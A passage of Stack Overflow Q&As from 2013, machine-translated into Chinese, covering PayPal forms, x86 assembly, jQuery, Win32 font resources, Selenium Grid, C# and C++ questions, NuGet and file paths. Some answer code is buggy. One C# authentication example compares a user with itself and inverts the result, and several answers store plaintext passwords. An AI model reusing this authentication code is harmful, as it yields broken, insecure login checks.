您可以在传入日期时指定基准年。而不是使用

```
[formatter setDateFormat:@"DDD"]; 
```

利用

```
[formatter setDateFormat:@"yyyy-DDD"]; 
```

然后，将您的年份字符串更改为

```
NSString *dayOfTheYearString = [NSString stringWithFormat:@"1970-%i", i]; 
```

# paypal - 发送多个 Paypal 项目并预先填写运输表格

> ID：15232781
> 
> 赞同：1
> 
> 时间：2013-03-05T19:48:14.900
> 
> 标签：paypal, cart, shopping

根据[此页面](https://www.paypal.com/cgi-bin/webscr?cmd=p/pdn/howto_checkout-outside)，您可以通过更改此页面将多个项目发送到 Paypal 结帐

```
<input type="hidden" name="cmd" value="_xclick"> 
```

对此

```
<input type="hidden" name="cmd" value="_cart">
<input type="hidden" name="upload" value="1"> 
```

此外，如果您想从第 3 方购物车预填充运输表格，您需要更改

```
<input type="hidden" name="cmd" value="_xclick"> 
```

对此

```
<input type="hidden" name="cmd" value="_ext-enter"> 
<input type="hidden" name="redirect_cmd" value="_xclick"> 
```

我的问题是，如果你想两者都做怎么办：将每件商品单独发送到 Paypal 并预先填写运输表格。但是，这似乎是不可能的，因为第一件事需要

```
<input type="hidden" name="cmd" value="_cart"> 
```

第二个需要

```
<input type="hidden" name="cmd" value="_ext-enter"> 
```

这显然是冲突的。反正有没有做我想做的事？当然，Paypal 的某个人一定认为有人想将所有购物车商品单独发送到 Paypal，并预先填写运输信息表格。如果有人可以帮助我解决这个问题，我将不胜感激。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:01:39.873

您不需要使用以下行：

```
<input type="hidden" name="cmd" value="_ext-enter"> 
<input type="hidden" name="redirect_cmd" value="_xclick"> 
```

相反，只需使用这些代码行：

```
<input type="hidden" name="cmd" value="_cart">
<input type="hidden" name="upload" value="1"> 
```

如果您想为购物车中的第一件和第二件设置运费，您只需使用 shipping_x 进行设置

```
<input type="hidden" name="shipping_1" value="1.99">
<input type="hidden" name="shipping_2" value="4.99"> 
```

# assembly - 在emu8086中添加两个64位数字

> ID：15232783
> 
> 赞同：1
> 
> 时间：2013-03-05T19:48:31.483
> 
> 标签：assembly, x86, addition, x86-16

我已经搜索了大约一天，但我找不到任何关于`adding 64 bit numbers in assembly - emu8086`

我怎样才能做到这一点 ？

我的寄存器只有 16 位，我有 2 个 64 位。我正在使用的应用程序是emu8086。（这是一个学校项目）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-05T20:14:29.403

用于`adc`在单个 16 位加法之间传播进位。以下会将内存中的数字 2 添加到内存中的数字 1：

```
mov ax, [num1_bits0_15]
add ax, [num2_bits0_15]
mov [num1_bits0_15], ax

mov ax, [num1_bits16_31]
adc ax, [num2_bits16_31]
mov [num1_bits16_31], ax

mov ax, [num1_bits32_47]
adc ax, [num2_bits32_47]
mov [num1_bits32_47], ax

mov ax, [num1_bits48_63]
adc ax, [num2_bits48_63]
mov [num1_bits48_63], ax 
```

# javascript - jquery append() 适用于 chrome 调试器和 IE，但不适用于 Chrome

> ID：15232798
> 
> 赞同：2
> 
> 时间：2013-03-05T19:49:33.737
> 
> 标签：javascript, jquery, html

我有一个奇怪的情况，我的代码在调试器（Chrome）中工作，也可以在 IE 9 上工作，但不能在 chrome 和 Firefox 中工作。我要做的就是将一堆列表元素附加到列表中。

HTML：

```
<div id="FriendSelector">
     <ul></ul>
</div> 
```

JS：

```
var friends = []; //this gets loaded with about 600 friend objects (name, icon, id) earlier

function openFriendSelector() {
    var $friendSelector = $('#FriendSelector');
    $friendSelector.show();
    bindFriends();
}

function bindFriends() {
    var $list = $('#FriendSelector ul');

    for (i = 0; i < friends.length; i++) {
        var friend = '<li id="' + friends[i].id + '"><div><img src="' + friends[i].icon + '" class="avatar"/>' + friends[i].name+ '</div></li>';
        $list.append(friend);
    }
} 
```

当我单击打开 FriendSelector DIV（最初隐藏）的按钮时，我看到一个空白 DIV，但是，如果我关闭弹出窗口并重新打开它，朋友们就在那里......

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T21:03:47.917

发现问题。该数组需要几秒钟才能加载（通过 ajax）。因此，在页面加载后，如果我等待几秒钟然后打开 div，它就可以工作。这解释了为什么它在调试器中工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:55:34.507

尽量避免`.append()`一次调用这么多，因此请替换以下代码：

```
for (i = 0; i < friends.length; i++) {
        var friend = '<li id="' + friends[i].id + '"><div><img src="' + friends[i].icon + '" class="avatar"/>' + friends[i].name+ '</div></li>';
        $list.append(friend);
    } 
```

对于这个：

```
for (i = 0, friend=''; i < friends.length; i++) {
        friend +='<li id="' + friends[i].id + '"><div><img src="' + friends[i].icon + '" class="avatar"/>' + friends[i].name+ '</div></li>';
}
$list.append(friend); 
```

**更新：**
尝试在显示 div 之前加载朋友，如下所示：

```
function openFriendSelector() {
    bindFriends();
}

function bindFriends() {
    var $list = $('#FriendSelector ul');

    for (i = 0, friend = ''; i < friends.length; i++) {
        friend = '<li id="' + friends[i].id + '"><div><img src="' + friends[i].icon + '" class="avatar"/>' + friends[i].name+ '</div></li>';
    }
    $list.append(friend);
    $list.parent().show();
} 
```

# c++ - AddFontMemResourceEx

> ID：15232801
> 
> 赞同：3
> 
> 时间：2013-03-05T19:49:41.090
> 
> 标签：c++, winapi, fonts

根据我找到的所有示例，以下代码应该可以将字体从存储在我的可执行文件中的二进制资源加载到系统内存，但它不起作用。“myfont”是资源文件中与 IDR_FONT 关联的 ttf 的名称。

```
 DWORD   Count ;
    HRSRC   Resource = FindResource(GetModuleHandle(NULL),MAKEINTRESOURCE(IDR_FONT),"BINARY") ;
    DWORD   Length   = SizeofResource(GetModuleHandle(NULL),Resource) ;
    HGLOBAL Address  = LoadResource(GetModuleHandle(NULL),Resource) ;
    HANDLE Handle = AddFontMemResourceEx(Address,Length,0,&Count) ;
    if(Handle==0)
    {
        MessageBox(hWnd,"Font load failed", "Error",NULL);
    }

        LOGFONT logfont; //set window font
        logfont.lfCharSet = DEFAULT_CHARSET;
        logfont.lfClipPrecision = CLIP_DEFAULT_PRECIS;
        logfont.lfEscapement = 0;
        memcpy(logfont.lfFaceName, "myfont", LF_FACESIZE); 
        logfont.lfHeight = 14; 
        logfont.lfItalic = FALSE; 
        logfont.lfOrientation = 0;
        logfont.lfOutPrecision = OUT_TT_PRECIS;
        logfont.lfQuality = PROOF_QUALITY;
        logfont.lfStrikeOut = FALSE;
        logfont.lfUnderline = FALSE;
        logfont.lfWeight = FW_DONTCARE; 
        hFont = CreateFontIndirect(&logfont); 
```

任何想法我做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T20:20:37.080

您的代码有两个问题。

您没有检查任何 API 函数是否失败。最有可能的是，您的调用`FindResource()`失败，因为`"BINARY"`不是[标准资源类型](http://msdn.microsoft.com/en-us/library/windows/desktop/ms648009.aspx)。用户定义的资源应该使用`RCDATA`：

```
HRSRC Resource = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(IDR_FONT), RT_RCDATA); 
```

或者，`FONT`如果它是一个实际的标准`FONT`资源：

```
HRSRC Resource = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(IDR_FONT), RT_FONT); 
```

不过，资源类型的实际名称取决于用于将资源添加到可执行文件的 .RC 文件的内容。

另一个问题，更重要的是，您实际上并没有访问资源的原始数据，因此您可以将真正的字体数据传递给`AddFontMemResourceEx()`. 你需要使用`LockResource()`它。

尝试更多类似的东西：

```
HANDLE AddResourceFont(LPCTSTR ResID, DWORD *Installed)
{
    if (Installed) *Installed = 0;

    HMODULE hMod = GetModuleHandle(NULL);
    DWORD Count, ErrorCode;

    HRSRC Resource = FindResource(hMod, ResID, RT_RCDATA); // or RT_FONT or whatever your actual resource type is
    if (!Resource)
    {
        ErrorCode = GetLastError();
        //...
        return NULL;
    }

    DWORD Length = SizeofResource(hMod, Resource);
    if ((Length == 0) && (GetLastError() != 0))
    {
        ErrorCode = GetLastError();
        //...
        return NULL;
    }

    HGLOBAL Address = LoadResource(hMod, Resource);
    if (!Address)
    {
        ErrorCode = GetLastError();
        //...
        return NULL;
    }

    PVOID FontData = LockResource(Address);
    if (!FontData)
    {
        ErrorCode = GetLastError();
        //...
        return NULL;
    }

    HANDLE Handle = AddFontMemResourceEx(FontData, Length, 0, &Count);
    if (!Handle)
    {
        ErrorCode = GetLastError();
        //...
        return NULL;
    }

    if (Installed) *Installed = Count;
    return Handle;
} 
```

.

```
DWORD Count = 0;
HANDLE hFont = AddResourceFont(MAKEINTRESOURCE(IDR_FONT), &Count);
if (hFont)
{
    //...
    RemoveFontMemResourceEx(hFont);
} 
```

# jquery - 为什么 jQuery.val 在 Internet Explorer 7 (IE7) 中返回一个数组而不是一个字符串？

> ID：15232805
> 
> 赞同：1
> 
> 时间：2013-03-05T19:50:02.853
> 
> 标签：jquery, internet-explorer-7

我正在尝试从以下选择元素中获取值。假设用户选择了第一个选项。

```
<select class="your-class" type="text">
    <option value='one'>One</option>
    <option value='two'>Two</option>
    <option value='three'>Three</option>
</select> 
```

的JavaScript：

```
$("select.your-class").val()
//returns ["one"] in IE7, returns "one" in other browsers 
```

为什么 IE7 返回一个数组，而不是单个字符串？这不是一个选择多个元素。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-05T19:50:02.853

问题是`type`似乎被错误地添加到`select`元素的属性（也许它最初是一个文本`input`元素，它被切换到了`select`）？。删除属性以解决问题。

在幕后，jQuery 使用以下布尔值来确定您的`select`元素是选择一个（标准选择框）还是选择多个（选择具有 multiple 属性的元素）。

```
var IsSelectOne = elem.type === "select-one" || elem.selectedIndex < 0; 
```

设置该`type`属性会覆盖`'select-one'`IE7 中的默认值，这会导致此布尔值为 false。由于布尔值是假的，这告诉 jQuery 你有一个多选元素，它为你提供了一个数组，而不是单个字符串。

# c# - RemoteWebDriver 无法在 45000 毫秒内绑定到锁定端口 7054

> ID：15232806
> 
> 赞同：2
> 
> 时间：2013-03-05T19:50:03.707
> 
> 标签：c#, automation, webdriver, selenium-webdriver

我使用 WebDriver 的 .NET 绑定通过 Grid2 同时运行测试。单独运行测试是没有问题的，但是通过Grid运行多个测试时，偶尔会出现以下错误，而一旦出现，通常多个测试失败，原因相同：

> 无法在 45000 毫秒内绑定到锁定端口 7054 构建信息：版本：'2.29.0'，修订：'58258c3'，时间：'2013-01-17 22:46:35' 系统信息：os.name：'Windows Server 2008 R2', os.arch: 'x86', os.version: '6.1', java.version: '1.7.0_11' 驱动信息: driver.version: FirefoxDriver

我们已将问题的根源追溯到我们创建 RemoteWebDriver 实例的位置，如下所示：

```
 var desiredCapabilites = new DesiredCapabilities();

            desiredCapabilites.SetCapability(CapabilityType.BrowserName, "firefox");
            desiredCapabilites.SetCapability(CapabilityType.Platform, new Platform(PlatformType.Windows));
            desiredCapabilites.SetCapability(CapabilityType.Version, "14.0.1");
                try { _driver = new RemoteWebDriver(new Uri("http://qwautomation:4444/wd/hub"), desiredCapabilites, TimeSpan.FromSeconds(180.0)); }
                catch (Exception ex) { Notes.Add("AUTOMATION ERROR: This error originates from MasterSetup.cs (line 47)"); Notes.Add("AUTOMATION ERROR: " + ex.Message); Exception("AUTOMATION ERROR: This error originates from MasterSetup.cs (line 47)"); } 
```

其中，qwautomation 是我们的 Grid Hub 所在的机器。我的假设是集线器正在将测试分派到端口上已经包含 FireFox 实例的节点，或者 JVM 没有正确处理会话（因为我可以在节点机器中看到带有 WebDriver 会话 ID 的文件夹临时文件夹）。我已经为节点和集线器编写了配置文件，我将在下面发布。如果无法绑定到 FireFox 端口，我不知道是否有办法将测试“排队”。

中心

```
{
        "port": 4444,
        "newSessionWaitTimeout": 30000,
        "nodePolling": 5000,
        "cleanUpCycle": 5000,
        "timeout": 300000,
        "browserTimeout": 0,
        "maxSession": 1
} 
```

节点

```
{
    "capabilities":
            [
                {
                    "browserName":"firefox",
                    "maxInstances":1                
                }

            ],
    "configuration":
            {
                    "cleanUpCycle":2000,
                    "timeout":180000,
                    "maxSession":5,
                    "hubPort":4444,
                    "hubHost":"qwautomation"
            }
} 
```

编辑：我已经从 DesiredCapabilities 对象中删除了“版本”功能，并且在几次测试运行后没有看到错误表面。我不知道这是否是一个实际的解决方案，但它似乎至少降低了异常的风险。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:20:41.310

我发现重新启动服务器通常可以解决问题。如果问题仍然存在，请尝试通过网格运行更少的连续测试或增加 Selenium 节点上的内存容量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-21T16:02:14.553

我多次遇到这个错误，我发现我实际上是它的原因。

我通常将远程桌面从我的开发计算机运行到我的虚拟机中，以观察在我的网格上进行的测试。

当我使用 Alt-Tab 和 Shift-Alt-Tab 在本地桌面上切换窗口时，我已经在 Selenium 启动 FireFox 时准确地选择了 VM，并且由于我按住键而无意中导致 Firefox 以安全模式启动。

发生这种情况时，Firefox 会等待确认您确实想以安全模式启动，并且永远不会完全打开。在您确认之前，所有后续打开 FireFox 的请求都将失败。

当错误发生时，我曾经停止测试并从测试生成器开始重新启动一切，直到有一天我首先开始使用虚拟机，注意到对话框并开始挖掘对话框的原因。就在那时，我意识到我导致 FireFox 以这种方式启动。现在我更小心了，不再有问题了。

# asp.net - 无法在 html 中调整图像大小（cshtml asp.net mvc 4）

> ID：15232808
> 
> 赞同：2
> 
> 时间：2013-03-05T19:50:11.910
> 
> 标签：asp.net, html, razor, asp.net-mvc-4

无法调整图像大小：当我更改*高度*属性时，什么也没有发生（即使我将其删除），但图像大小仅在*宽度*更改时才会做出反应（宽度和高度都更改）。这是行（剃刀视图，asp.net mvc 4，html5）：

```
<img width="150" height="150" src="@Url.Action("myAction", "myController")" /> 
```

**问题：**
1）这种行为的原因是什么？
2) 如何调整图像大小，使其不会超出特定范围（例如宽度 150 和高度 150）。我有不同尺寸的图像，我希望它们具有相同的尺寸。

谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-05T19:55:27.077

为什么不使用类或样式？

`<img src="" alt="" class="yourclass" />`
`<img src="" alt="" style="width: 150px; height: 150px;" />`

# c++ - 如何在多个类中使用朋友功能

> ID：15232809
> 
> 赞同：1
> 
> 时间：2013-03-05T19:50:15.207
> 
> 标签：c++, function, friend

我正在尝试创建一个非成员`operator<<`。但是，我希望我的两个班级可以访问操作员。运营商是

```
void operator<< (ClassA & a, ClassB & b) 
```

在两个类的公共部分，我说：

```
friend void operator<< (ClassA & a, ClassB & b); 
```

但是，事实证明，操作员可以访问私有成员变量，`CLass B`但不能访问私有成员变量`Class A`。

为什么？

真实代码：在cpp文件中：

```
void operator<< (Hand& h, Deck& d){

    h.hand.push_back(d.card[0]);
    sort(h.hand.begin(),h.hand.end());
    d.card.erase(d.card.begin());
} 
```

在头文件中：

```
class Deck {

private:
    vector<Card> card;

public:
    friend void operator<< (Hand& , Deck& );
};

class Hand {

private:
    vector<Card> hand;

public:
    friend void operator<< (Hand& , Deck& );
}; 
```

并且卡文件不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T20:03:14.913

**更新**已编辑的问题：以下代码编译对我来说没有问题：

```
#include <vector>
#include <algorithm>
typedef int Card;

class Hand; // NOTE forward declaration

class Deck {
private:
    std::vector<Card> card;

public:
    friend void operator<< (Hand& , Deck&);
};

class Hand {
private:
    std::vector<Card> hand;

public:
    friend void operator<< (Hand& , Deck&);
};

void operator<< (Hand& h, Deck& d) {
    h.hand.push_back(d.card[0]);
    std::sort(h.hand.begin(),h.hand.end());
    d.card.erase(d.card.begin());
}

int main()
{
} 
```

**您是否忘记在头文件中转发声明 Hand**？

* * *

您可能会感到困惑，因为您*可以*在类的声明之一中*定义*静态友元函数的主体。

尽管如此，朋友*声明*始终只是一个*声明*。所以，事实上

```
struct A;
struct B;

struct A
{
    friend bool operator<<(A const&, B const&);
};

struct B
{
    friend bool operator<<(A const&, B const&);
};

bool operator<<(A const&, B const&)
{
    // access to both A and B
    return false;
} 
```

等价于

```
struct A;
struct B;

struct A
{
    friend bool operator<<(A const&, B const&)
    {
        // access to both A and B
        return false;
    }
};

struct B
{
    friend bool operator<<(A const&, B const&);
}; 
```

# c# - 动态域上的表单身份验证

> ID：15232811
> 
> 赞同：0
> 
> 时间：2013-03-05T19:50:26.600
> 
> 标签：c#, asp.net, .net, asp.net-mvc-3

我正在尝试实现使用 .Net 表单身份验证的 SSO 解决方案。我知道为所有子域设置一个 cookie，如下所示：

```
<forms 
   name="name" 
   loginUrl="URL" 
   defaultUrl="URL"
   domain=".example.com">
</forms> 
```

我的问题 - 有没有办法让“域”字段动态化？这样我就可以将域附加为 URL 参数？

```
http://SSO.com/?domain=example.com 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:02:22.823

这里的这个`domain`参数是用来设置在认证的cookies上的。

您可以简单地忽略它，这意味着根本不添加它，cookie 将设置为 url 上看到的内容。

现在这里的诀窍是确保您的站点始终使用相同的子域，例如，始终调用`www.example.com` （不是一次调用 www.example.com，一次调用 example.com）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T21:10:57.613

不幸的是，您要求的内容不适用于开箱即用的 Forms Auth。如果您将域设置为您用于身份验证的域以外的域，您的身份验证应用程序将无法看到 cookie，并认为用户从未登录。

这类事情通常由需要 SSO 调用 SSO 域以进行身份​​验证的域处理。[您可以在 CAS ( http://en.wikipedia.org/wiki/Central_Authentication_Service](http://en.wikipedia.org/wiki/Central_Authentication_Service) ) Facebook Connect 甚至 Microsoft 的 Passport 身份验证等系统中看到这一点。

如果您正在寻找支持良好的 MS 友好型 SSO，请查看新的 Azure Active Directory 系统 ( [http://blogs.technet.com/b/serverandtools/archive/2012/07/12/introducing- windows-azure-active-directory-ad-web-single-sign-on-sso.aspx](http://blogs.technet.com/b/serverandtools/archive/2012/07/12/introducing-windows-azure-active-directory-ad-web-single-sign-on-sso.aspx) )

# javascript - 给出 NaN 的 Javascript 数组

> ID：15232812
> 
> 赞同：1
> 
> 时间：2013-03-05T19:50:29.363
> 
> 标签：javascript, arrays

我有一些 HTML 应该在画布周围弹跳球，但是当我将它们设置为随机位置并使用`alert("Co-ordinates " + (cirX[i]) + " x " + (cirY[i]));`. 这将返回“坐标 NaN x NaN”。我试图用一个没有阵列的球来做到这一点，它奏效了。我不确定我的数组编码是否不好，或者是否是其他原因。这是我的 HTML：

```
<!Doctype HTML>
<head>
<script>
var cirX = [];
var cirY = [];
var chX = [];
var chY = [];
var width;
var height;

function initCircle(nBalls) {
  alert(nBalls)
  for(var i = 0; i<nBalls;i++) {
    alert("loop  " + i)
    chX[i] = (Math.floor(Math.random()*200)/10);
    chY[i] = (Math.floor(Math.random()*200)/10);
    cirX[i] = Math.floor(Math.random()*width);
    cirY[i] = Math.floor(Math.random()*height);
    alert("Co-ordinates " + (cirX[i]) + " x " + (cirY[i]));

    circle(cirX[i],cirY[i],3);
    setInterval('moveBall(i)',10);
  }
}

function moveBall(ballNum) {
    if(cirX[ballNum] > width||cirX[ballNum] < 0) {
      chX[ballNum] = 0-chX[ballNum];
    }
    if(cirY[ballNum] > height|| cirY[ballNum] < 0) {
      chY[ballNum] = 0-chY[ballNum];
    }
    cirX[ballNum] = cirX[ballNum] + chX[ballNum];
    cirY[ballNum] = cirY[ballNum] + chY[ballNum];
    circle(cirX[ballNum],cirY[ballNum],3);

}

function circle(x,y,r) {
  var c=document.getElementById("canvas");
  var ctx=c.getContext("2d");
  canvas.width = canvas.width;
  ctx.fillStyle="#FF0000";
  ctx.beginPath();
  ctx.arc(x, y, r, 0, Math.PI*2, true);
  ctx.fill();
  width = canvas.width;
  height = canvas.height;
}
</script>
</head>
<body>
<canvas id="canvas" width="400" height="300">
</canvas>
<script>
initCircle(3); //this sets the number of circles
</script>
</body> 
```

我已经查找了如何初始化数组等，但我似乎做得对吗？在此先感谢您的帮助！

**编辑：**
尽管解决了上述问题，但只有一个球以不同的速度移动，尽管变量`ballNum`按`moveBall()`预期从 0 变化到 2（通过添加测试`alert(ballNum)`）。有谁知道为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:54:27.410

你打电话给这条线

```
cirX[i] = Math.floor(Math.random()*width); 
```

何时`width`仍未定义。所以你只能得到`NaN`结果。

`moveBall`要从setInterval正确调用函数，您可以使用

```
(function(i) { // embedds i to protect its value (so that it isn't the one of end of loop
   setInterval(function(){moveBall(i)}, 10);
})(i); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T20:00:26.317

这是因为`width`第一次执行语句时未定义。您可以在开始时获取画布及其尺寸并将其保持在全局范围内。

[http://jsbin.com/agavoq/9/edit](http://jsbin.com/agavoq/9/edit)

要调用 setInterval，您可以使用保留值的自调用函数`i`

```
(function(x){
  setInterval(moveBall,10, x);
})(i); 
```

或者干脆

```
setInterval(moveBall,10, i); 
```

或者

```
setInterval('moveBall(' + i+ ')',10); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:53:04.707

我看到另一个问题，因为看看这条线

```
setInterval('moveBall(i)',10); 
```

`i`不是你想的那样。您不应该在`setTimeout`.

# c# - 将字符串添加到字符串数组

> ID：15232813
> 
> 赞同：3
> 
> 时间：2013-03-05T19:50:32.523
> 
> 标签：c#

```
class Myclass
{
    static string[] user_Name = { "admin", "user1", "user2" };
    static string[] user_Password ={ "admin", "123", "789" };

    public static void Check_Method(string u_name, string u_password)
    {

        for (int i = 0; i < user_Name.Length; i++)
        {
            if (u_name == user_Name[i] && u_password == user_Password[i])
            {
                MessageBox.Show("login successful");
                break;
            }
            else
            {
                if (i == (user_Name.Length - 1))
                    MessageBox.Show("Badshow");
            }
        }
    }
    public static void add_user(string name, string password)
    {
        i=user_Name.Length;
        user_Name[i]=name;
        user_Password[i]=password;
        //here i want to add another user but im unable to find the way
    }
} 
```

但它给出了一个错误，即它超出了数组的边界。

执行此操作最方便的方法是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-05T19:51:46.443

如果您需要可变大小的存储，请不要使用数组。

改为使用`List<string>`- 它允许您使用`Add`物品。

* * *

在您的情况下，您对两个数组的选择是有问题的，因为每个用户都有一个相应的密码 - 总是。这表明您应该有一个自定义类来保存用户/密码对。

有了这样一个类（比如`User`），您将拥有`List<User>`并简化您的代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T19:53:43.983

尝试使用`List<>`.

```
class Myclass
{
    static List<string> user_Name = new List<string>{ "admin", "user1", "user2" };
    static List<string> user_Password = new List<string>{ "admin", "123", "789" };

    public static void Check_Method(string u_name, string u_password)
    {

        for (int i = 0; i < user_Name.Length; i++)
        {
            if (u_name == user_Name[i] && u_password == user_Password[i])
            {
                MessageBox.Show("login successful");
                break;
            }
            else
            {
                if (i == (user_Name.Length - 1))
                    MessageBox.Show("Badshow");
            }
        }
    }
    public static void add_user(string name, string password)
    {
        user_Name.Add(name);
        user_Password.Add(password);
    }
} 
```

这是一个重构版本：

用户包含在用户类中。

它们会`IEquatable<>`比较他们的用户名/密码（您可能需要考虑查看`Guid`以保持它们的唯一性）。

轻松添加/删除用户。

```
public class User : IEquatable<User>
{
    public User(string name, string password)
    {
        Name = name;
        Password = password;
    }

    public string Name { get; set; }
    public string Password { get; set; }

    public bool Equals(User other)
    {
        if (other == null) return false;

        return other.Name == Name && other.Password == Password;
    }
}

public class AuthenticationManager
{
    private List<User> LoggedInUsers = new List<User>
    { new User("Admin", "admin"), new User ("user1", "123"), new User ("user2", "789") };

    public bool Authenticate(string userName, string password)
    {
        var user = new User(userName, password);

        //if the user is in the list it will return false otherwise true.
        return !LoggedInUsers.Any(u => user.Equals(user)); 
    }

    public void Login(string name, string password)
    {
        LoggedInUsers.Add(new User(name, password));
    }

    public void Logout(string name, string password)
    {
        LoggedInUsers.Remove(new User(name, password));
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:56:15.520

尝试使用`List<string>`类而不是`string[]`

`object.Add()`并使用方法将项目添加到数组

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T19:54:34.970

好吧，我想你可能想错了。您使用数组的方式是为一个对象而尖叫。

我会让 User 成为这样的对象

```
public class User 
{
  public string UserName { get; set;}
  public string Password { get; set;}
} 
```

然后，我将改为维护用户列表。这样您就不需要维护数组索引，并且可以轻松地将新用户添加到列表中。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-05T19:55:51.213

为什么不使用 and`List`并应用 DTO 而不是 multiples `string[]`？

尝试这样的事情：

1）为您的用户创建一个 DTO：

```
public class UserDTO
{
    public string UserName { get; set; }
    public string Password { get; set; }    
} 
```

2) 使用和`List<DTO>`

```
class Myclass
{
    static List<UserDTO> users = new List<UserDTO>()
    {
        new UserDTO() { UserName= "admin", Password = "admin" } ,
        new UserDTO() { UserName= "user1", Password = "123" } ,
        new UserDTO() { UserName= "user2", Password = "789" } ,
    }

    public static void Check_Method(string u_name, string u_password)
    {
        if (users.Exists(x => x.UserName == u_name && x.Password == u_password)
        {
               MessageBox.Show("login successful");
        }
        else
        {
            MessageBox.Show("Badshow");
        }
    }
    public static void add_user(string name, string password)
    {
        users.Add(new UserDTO() { UserName= name, Password = password });
    }
} 
```

# c# - 删除扩展上的引用

> ID：15232814
> 
> 赞同：6
> 
> 时间：2013-03-05T19:50:33.517
> 
> 标签：c#, asp.net-mvc-4, visual-studio-2012, moq, nuget

我正在使用`Visual Studio .NET 2012`并`NuGet`管理我的 ASP.NET MVC 4 解决方案的引用。

如何删除通过创建的参考`NuGet`？我知道我可以通过右键单击删除它，删除。然而，这对我来说似乎很危险，因为引用的包可能已经引入了它们自己的其他依赖项。

在我的主项目中，我右键单击`References->Manage NuGet Packages`并安装`Moq`（请参见下面的屏幕截图）

![管理 NuGet 包](../Images/07d1467e6a2cd1d4a83bd2dff1004320.png)

但是，我无法`Moq`在我的测试中引用。

我意识到`Guestbook.Tests`创建 ASP.NET MVC 4 解决方案时创建的项目，它有自己的`References`.

所以我`Moq`在这里添加，但我想清理并`Moq`从我的主`Guestbook`项目中删除。

谁能指出我如何安全地做到这一点的正确方向？

非常感谢您！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-05T19:54:38.017

最简单的方法是转到`TOOLS`-> `Library Package Manager`->`Package Manager Console`并输入以下内容：

`Uninstall-Package Moq`

您应该始终使用包管理器，而不仅仅是删除文件，以便它清理所有内容，包括您可能遗漏的任何内容。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-05T19:53:07.923

使用与上面显示的相同的屏幕，选择已安装的软件包，然后找到 MOQ 参考，然后您应该可以选择管理/卸载。

![在此处输入图像描述](../Images/bd50a4bcc269dcd1ff6ba63d62bcf636.png)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-05T19:57:20.857

您可以使用带有命令的包管理器控制台：Uninstall-Package PackageId 将其删除，或者只是从解决方案文件夹下的“包”文件夹中删除包文件夹。有关包管理器控制台的更多信息，您可以在此处找到：http: [//docs.nuget.org/docs/reference/package-manager-console-powershell-reference](http://docs.nuget.org/docs/reference/package-manager-console-powershell-reference)

# c++ - 查找使用 C++ 创建的文件

> ID：15232815
> 
> 赞同：1
> 
> 时间：2013-03-05T19:50:34.833
> 
> 标签：c++, macos, path, osx-lion

我正在学习用 C++ 编程。我正在使用 Mac OS X 并尝试通过编写以下代码来创建包含一些数据的文件：

```
ofstream myfile;     
myfile.open ("primescount.csv");     
myfile << "Writing this to a file.\n";     
myfile.close(); 
```

在我使用的教程中，我发现这样创建的文件可以在与可执行文件相同的目录中找到。然而，当我在那里看时，我什么也看不见。

所以我的问题是：我在哪里可以找到文件（primescount.csv）？

我希望你能提供帮助，尽管这对你们来说可能不是最鼓舞人心的问题。

问候，拉斯

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:54:58.777

该文件将在当前目录中找到——这*可能* 与可执行文件在同一个目录，但通常不是。

对于 Xcode，当前工作目录默认为 Run 目标的 build-target 文件夹，该文件夹通常隐藏在 temp-folder 的深处。您可以通过执行以下操作更改启动时当前工作目录的内容：

1.  单击主工具栏上 STOP 按钮右侧的项目框
2.  选择编辑方案
3.  在左侧窗格列表中选择“运行”子方案。
4.  选择选项选项卡，
5.  选中“使用自定义工作目录”复选框
6.  将工作目录设置到您*知道*的某个位置（例如您的项目根文件夹，甚至您的主文件夹，通常`/Users/YourUserName`）。

您的文件应该在您指定的目录中创建，前提是您有权在该文件夹中创建文件，如果它位于您的用户文件夹下，则默认情况下您将创建该文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:58:30.730

该文件在“工作目录”中创建。不同的 IDE 和执行环境对工作目录的设置不同。如果您使用的是 Xcode，那么当您开始调试时，工作目录将设置为您为当前方案设置的任何内容：

[谷歌图片搜索的截图](https://www.google.com/search?q=xcode+working+directory&hl=en&rlz=1C1CHFX_enUS392US393&source=lnms&tbm=isch&sa=X&ei=nE02Ue-hBIeX0QHBj4DwCA&ved=0CAcQ_AUoAQ&biw=1496&bih=806#imgrc=12S-BkbZXsZwfM%3A%3B9Mu5VMPrly0YWM%3Bhttp%253A%252F%252Fchaosinmotion.com%252Fblog%252Fwp-content%252Fuploads%252F2012%252F01%252Fsettingimage.png%3Bhttp%253A%252F%252Fchaosinmotion.com%252Fblog%252F%253Fpaged%253D2%3B600%3B407)

如果您从命令行运行程序，那么工作目录就是您所在的目录。即，该命令`cd`设置工作目录。您可以使用该命令`pwd`打印工作目录的名称。

# svn - 使用来自不同文件夹的文件在 SVN 中创建分支

> ID：15232817
> 
> 赞同：0
> 
> 时间：2013-03-05T19:50:43.540
> 
> 标签：svn, branch

